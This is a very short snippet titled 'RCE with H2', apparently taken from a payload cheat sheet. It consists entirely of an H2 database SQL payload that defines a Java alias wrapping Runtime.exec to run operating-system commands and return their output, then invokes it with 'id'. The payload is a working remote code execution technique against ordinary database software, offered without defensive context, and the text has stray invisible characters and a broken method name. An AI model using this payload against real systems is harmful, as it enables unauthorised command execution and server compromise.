## RCE with H2

```
CREATE​ ​ALIAS​ SHELLEXEC ​AS​ $$ ​String​ shellexec(​String​ cmd) throws java.io.IOException { java.util.Scanner s = ​new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelim iter(​"\\A"​); return s.hasNext() ? s.next() : ""; }$$;
CALL​ SHELLEXEC(​'id'​)
```
